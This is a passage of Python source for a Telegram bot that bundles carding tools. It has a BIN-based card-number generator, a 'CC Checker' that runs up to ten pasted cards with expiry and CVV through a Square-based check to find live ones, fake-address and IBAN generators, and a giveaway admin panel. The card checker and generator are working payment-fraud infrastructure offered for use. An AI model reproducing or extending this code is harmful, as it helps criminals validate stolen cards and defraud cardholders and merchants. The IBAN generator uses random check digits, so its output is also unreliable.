        "in": {"country": "India 🇮🇳", "first": ["Aarav", "Diya"], "last": ["Sharma", "Patel"], "streets": ["MG Road"], "cities": ["Mumbai"], "states": ["MH"], "zips": ["400001"], "phone": "+91 98765 43210"},
        "id": {"country": "Indonesia 🇮🇩", "first": ["Budi", "Siti"], "last": ["Setiawan", "Lestari"], "streets": ["Jl. Sudirman"], "cities": ["Jakarta"], "states": ["DKI"], "zips": ["12190"], "phone": "+62 812 3456 7890"},
        "it": {"country": "Italy 🇮🇹", "first": ["Leonardo", "Giulia"], "last": ["Rossi", "Russo"], "streets": ["Via Roma"], "cities": ["Rome"], "states": ["RM"], "zips": ["00100"], "phone": "+39 320 123 4567"},
        "jp": {"country": "Japan 🇯🇵", "first": ["Haruto", "Yui"], "last": ["Sato", "Suzuki"], "streets": ["Nagata-cho"], "cities": ["Tokyo"], "states": ["Tokyo"], "zips": ["100-0001"], "phone": "+81 90-1234-5678"},
        "kz": {"country": "Kazakhstan 🇰🇿", "first": ["Timur", "Aigerim"], "last": ["Nurlan", "Omarov"], "streets": ["Dostyk Ave"], "cities": ["Astana"], "states": ["Astana"], "zips": ["010000"], "phone": "+7 701 123 4567"},
        "my": {"country": "Malaysia 🇲🇾", "first": ["Ahmad", "Siti"], "last": ["Tan", "Lee"], "streets": ["Jalan Ampang"], "cities": ["Kuala Lumpur"], "states": ["KL"], "zips": ["50450"], "phone": "+60 12-345 6789"},
        "mx": {"country": "Mexico 🇲🇽", "first": ["Mateo", "Sofia"], "last": ["Garcia", "Martinez"], "streets": ["Paseo de la Reforma"], "cities": ["Mexico City"], "states": ["CDMX"], "zips": ["06500"], "phone": "+52 55 1234 5678"},
        "ma": {"country": "Morocco 🇲🇦", "first": ["Youssef", "Kenza"], "last": ["Alami", "Bennani"], "streets": ["Mohammed V Blvd"], "cities": ["Casablanca"], "states": ["Casa"], "zips": ["20000"], "phone": "+212 612 345678"},
        "nz": {"country": "New Zealand 🇳🇿", "first": ["Oliver", "Isla"], "last": ["Clark", "Wright"], "streets": ["Queen Street"], "cities": ["Auckland"], "states": ["AK"], "zips": ["1010"], "phone": "+64 21 123 4567"},
        "pa": {"country": "Panama 🇵🇦", "first": ["Carlos", "Maria"], "last": ["Perez", "Gonzalez"], "streets": ["Via España"], "cities": ["Panama City"], "states": ["Panama"], "zips": ["0801"], "phone": "+507 6123-4567"},
        "pk": {"country": "Pakistan 🇵🇰", "first": ["Hamza", "Ayesha"], "last": ["Khan", "Malik"], "streets": ["Jinnah Avenue"], "cities": ["Islamabad"], "states": ["ICT"], "zips": ["44000"], "phone": "+92 300 1234567"},
        "pe": {"country": "Peru 🇵🇪", "first": ["Diego", "Lucia"], "last": ["Flores", "Ramos"], "streets": ["Av. Larco"], "cities": ["Lima"], "states": ["Lima"], "zips": ["15074"], "phone": "+51 912 345 678"},
        "pl": {"country": "Poland 🇵🇱", "first": ["Jakub", "Julia"], "last": ["Nowak", "Kowalski"], "streets": ["Marszałkowska"], "cities": ["Warsaw"], "states": ["Mazovia"], "zips": ["00-001"], "phone": "+48 500 123 456"},
        "qa": {"country": "Qatar 🇶🇦", "first": ["Fahad", "Noora"], "last": ["Al-Thani", "Al-Kuwari"], "streets": ["Corniche Street"], "cities": ["Doha"], "states": ["Doha"], "zips": ["00000"], "phone": "+974 5512 3456"},
        "sa": {"country": "Saudi Arabia 🇸🇦", "first": ["Salman", "Sara"], "last": ["Al-Saud", "Al-Otaibi"], "streets": ["King Fahd Road"], "cities": ["Riyadh"], "states": ["Riyadh"], "zips": ["11564"], "phone": "+966 50 123 4567"},
        "sg": {"country": "Singapore 🇸🇬", "first": ["Wei", "Li"], "last": ["Tan", "Lim"], "streets": ["Orchard Road"], "cities": ["Singapore"], "states": ["SG"], "zips": ["238859"], "phone": "+65 9123 4567"},
        "es": {"country": "Spain 🇪🇸", "first": ["Hugo", "Lucia"], "last": ["Garcia", "Martinez"], "streets": ["Gran Via"], "cities": ["Madrid"], "states": ["Madrid"], "zips": ["28013"], "phone": "+34 612 34 56 78"},
        "se": {"country": "Sweden 🇸🇪", "first": ["William", "Alice"], "last": ["Andersson", "Johansson"], "streets": ["Sveavägen"], "cities": ["Stockholm"], "states": ["Stockholm"], "zips": ["11157"], "phone": "+46 70 123 4567"},
        "ch": {"country": "Switzerland 🇨🇭", "first": ["Noah", "Mia"], "last": ["Muller", "Meier"], "streets": ["Bahnhofstrasse"], "cities": ["Zurich"], "states": ["Zurich"], "zips": ["8001"], "phone": "+41 79 123 45 67"},
        "th": {"country": "Thailand 🇹🇭", "first": ["Somchai", "Suda"], "last": ["Saelim", "Wong"], "streets": ["Sukhumvit Road"], "cities": ["Bangkok"], "states": ["Bangkok"], "zips": ["10110"], "phone": "+66 81 234 5678"},
        "tr": {"country": "Turkiye 🇹🇷", "first": ["Yusuf", "Zeynep"], "last": ["Yilmaz", "Kaya"], "streets": ["Istiklal"], "cities": ["Istanbul"], "states": ["Istanbul"], "zips": ["34430"], "phone": "+90 512 345 6789"},
        "uk": {"country": "United Kingdom 🇬🇧", "first": ["George", "Olivia"], "last": ["Smith", "Jones"], "streets": ["High Street"], "cities": ["London"], "states": ["England"], "zips": ["SW1A 1AA"], "phone": "+44 7123 456789"},
        "us": {"country": "United States 🇺🇸", "first": ["James", "Mary"], "last": ["Smith", "Johnson"], "streets": ["Broadway"], "cities": ["New York"], "states": ["NY"], "zips": ["10001"], "phone": "+1 (555) 123-4567"}
    }
    
    data = loc_database.get(country_code, loc_database["us"])
    
    fname = random.choice(data["first"])
    lname = random.choice(data["last"])
    street = f"{random.randint(1,9999)} " + random.choice(data["streets"])
    city = random.choice(data["cities"])
    state = data["states"]
    zip_code = random.choice(data["zips"]) if isinstance(data["zips"], list) else data["zips"]
    phone = data["phone"]
    
    text = (
        f"👉 <b>{data['country']} Address Generator</b>\n\n"
        f"𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: <code>{fname} {lname}</code>\n"
        f"𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: <code>{street}</code>\n"
        f"𝗖𝗶𝘁𝘆/𝗧𝗼𝘄𝗻/𝗩𝗶𝗹𝗹𝗮𝗴𝗲: <code>{city}</code>\n"
        f"𝗦𝘁𝗮𝘁𝗲/𝗣𝗿𝗼𝘃𝗶𝗻𝗰𝗲/𝗥𝗲𝗴𝗶𝗼𝗻: <code>{state}</code>\n"
        f"𝗣𝗼𝘀𝘁𝗮𝗹 𝗖𝗼𝗱𝗲: <code>{zip_code}</code>\n"
        f"𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: <code>{phone}</code>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{data['country'].split(' ')[0]}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

def show_country_list(message):
    sorted_countries = [
        ("Algeria", "dz"), ("Argentina", "ar"), ("Australia", "au"), ("Bahrain", "bh"),
        ("Bangladesh", "bd"), ("Belgium", "be"), ("Brazil", "br"), ("Cambodia", "kh"),
        ("Canada", "ca"), ("Colombia", "co"), ("Denmark", "dk"), ("Egypt", "eg"),
        ("Finland", "fi"), ("France", "fr"), ("Germany", "de"), ("India", "in"),
        ("Indonesia", "id"), ("Italy", "it"), ("Japan", "jp"), ("Kazakhstan", "kz"),
        ("Malaysia", "my"), ("Mexico", "mx"), ("Morocco", "ma"), ("New Zealand", "nz"),
        ("Panama", "pa"), ("Pakistan", "pk"), ("Peru", "pe"), ("Poland", "pl"),
        ("Qatar", "qa"), ("Saudi Arabia", "sa"), ("Singapore", "sg"), ("Spain", "es"),
        ("Sweden", "se"), ("Switzerland", "ch"), ("Thailand", "th"), ("Turkiye", "tr"),
        ("United Kingdom", "uk"), ("United States", "us")
    ]
    
    list_str = "📍 <b>Available Countries for Fake Address:</b>\n\n"
    for idx, (name, code) in enumerate(sorted_countries, 1):
        list_str += f"{idx}. {name} (<code>{code}</code>)\n"
        
    list_str += "\n💡 <i>နိုင်ငံကုဒ် (အသေးစာလုံး) ကို ဆက်လက် ပို့ပေးပါ (ဥပမာ - us, de, jp)</i>"
    bot.reply_to(message, list_str, reply_markup=get_main_menu(message.from_user.id))

def process_iban_prompt(message):
    if check_cancel(message): return
    
    country = message.text.strip().upper()
    flags = {"DE": "🇩🇪", "GB": "🇬🇧", "US": "🇺🇸"}
    flag = flags.get(country, "🌐")
    
    bank_code = "".join([str(random.randint(0, 9)) for _ in range(8)])
    acc_num = "".join([str(random.randint(0, 9)) for _ in range(10)])
    check_dig = f"{random.randint(10, 99)}"
    
    text = (
        f"🌍 <b>IBAN Details</b>\n\n"
        f"Country: <code>{country} {flag}</code>\n"
        f"IBAN: <code>{country}{check_dig}{bank_code}{acc_num}</code>\n"
        f"Length: <code>22</code>\n\n"
        f"Bank Code: <code>{bank_code}</code>\n"
        f"Account Number: <code>{acc_num}</code>\n"
        f"Check Digits: <code>{check_dig}</code>\n"
        f"BBAN: <code>{bank_code}{acc_num}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

# ==========================================
# Routing for Text, Auto-Detect & Buttons[span_10](start_span)[span_10](end_span)
# ==========================================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    add_user(message.from_user.id) 
    if is_banned(message.from_user.id): return
    text = message.text.strip()

    if text in ["🔐 Gen BIN", "/gen"]:
        bot.reply_to(message, "⏳ <b>BIN Generator</b>\nBIN သို့မဟုတ် Format ကို တိုက်ရိုက် ပို့ပေးပါ။\n(ဥပမာ - <code>412236</code>)", reply_markup=get_main_menu(message.from_user.id))
        return
    elif text in ["💳 Live Check", "/chk"]:
        bot.reply_to(message, "⏳ <b>CC Checker (Square Auth)</b>\nစစ်ဆေးလိုသော ကတ်များကို ပို့ပေးပါ။ (၁၀ ကတ်အထိ)\n(ဥပမာ - <code>cc|mm|yyyy|cvv</code>)", reply_markup=get_main_menu(message.from_user.id))
        return
    elif text in ["👉 Fake Address", "/fake"]:
        bot.reply_to(message, "⏳ <b>Fake Address</b>\nနိုင်ငံကုဒ် ပို့ပေးပါ။ (ဥပမာ - <code>us</code>, <code>de</code>, <code>jp</code>)\n\n💡 <i>နိုင်ငံစာရင်းကြည့်ရန် <code>list</code> ဟုရိုက်ပါ။</i>", reply_markup=get_main_menu(message.from_user.id))
        return
    elif text in ["ℹ️ IBAN Gen", "/iban"]:
        msg = bot.reply_to(message, "⏳ <b>IBAN Generator</b>\nနိုင်ငံကုဒ် ပို့ပေးပါ။ (ဥပမာ - <code>DE</code>, <code>GB</code>)", reply_markup=get_main_menu(message.from_user.id))
        bot.register_next_step_handler(msg, process_iban_prompt)
        return
    elif text in ["©️ CPF Gen", "/cpf"]:
        cmd_cpf(message)
        return
    elif text in ["👤 My Info", "/me"]:
        cmd_me(message)
        return
    elif text == "🎁 Giveaway Admin":
        if message.from_user.id != ADMIN_ID: return
        gw_text = (
            "🎁 <b>Giveaway Panel (Admin Only)</b> 🎁\n\n"
            "👤 <b>လူစာရင်း ထိန်းချုပ်ရန် (Bot DM တွင်သုံးရန်)</b>\n"
            "<code>/add [name]</code> - လူအသစ်ထည့်ရန်\n"
            "<code>/clearusers</code> - စာရင်းဖျက်ရန်\n\n"
            "🎁 <b>ဆုစာရင်း ထိန်းချုပ်ရန် (Bot DM တွင်သုံးရန်)</b>\n"
            "<code>/addprize [prize]</code> - ဆုထည့်ရန်\n"
            "<code>/clearprizes</code> - ဆုအားလုံးဖျက်ရန်\n\n"
            "🎲 <b>Channel ထဲတွင် တိုက်ရိုက်သုံးနိုင်သော Commands များ</b>\n"
            "<code>/gusers</code> - လူစာရင်းပြရန်\n"
            "<code>/prizes</code> - ဆုစာရင်းပြရန်\n"
            "<code>/pick</code> - မဲဖောက်ရန်\n\n"
            "💡 <b>အလွယ်တကူစာရင်းသွင်းရန်</b> ➔ Channel ရဲ့ Comment တွေကို ဒီ Chat ထဲ Forward ချလိုက်ရုံဖြင့် အလိုအလျောက် စာရင်းဝင်ပါမည်。"
        )
        bot.reply_to(message, gw_text, parse_mode="HTML", reply_markup=get_main_menu(message.from_user.id))
        return
    elif text.upper() == "LIST":
        show_country_list(message)
        return

    # --- Live Check CC Detection (Square Integration) ---
    matches = re.findall(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
    if matches:
        if len(matches) > 10:
            matches = matches[:10]
            
        msg = bot.reply_to(message, f"⏳ <b>Checking {len(matches)} cards via Square... Please wait.</b>")
        final_result = ""
        
        for idx, match in enumerate(matches):
            cc, mes, ano, cvv = match
            if len(ano) == 2: ano = "20" + ano
            
            res = square_check(cc, mes, ano, cvv)
            final_result += res + "\n\n"
            
            if (idx + 1) % 3 == 0 or (idx + 1) == len(matches):
                try:
                    bot.edit_message_text(final_result + f"⏳ <i>Checking {idx+1}/{len(matches)}...</i>", chat_id=message.chat.id, message_id=msg.message_id)
                except Exception:
                    pass
                    
        try:
            bot.edit_message_text(final_result + f"✅ <b>Check Completed!</b>", chat_id=message.chat.id, message_id=msg.message_id)
        except Exception:
            pass
        return

    all_country_codes = ["dz","ar","au","bh","bd","be","br","kh","ca","co","dk","eg","fi","fr","de","in","it","jp","kz","my","mx","ma","nz","pa","pk","pe","pl","qa","sa","sg","es","se","ch","th","tr","uk","us","gb","id"]
    if text.lower() in all_country_codes:
        generate_fake_address(message, text.lower())
        return

    if re.match(r'^\d{6}', text):
        generate_cc(message, text)
        return

@app.route('/')
def index():
    return "Bot is running successfully!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_server, daemon=True).start()
    setup_bot_commands()
    print("Telegram Bot Started...")
    bot.infinity_polling()
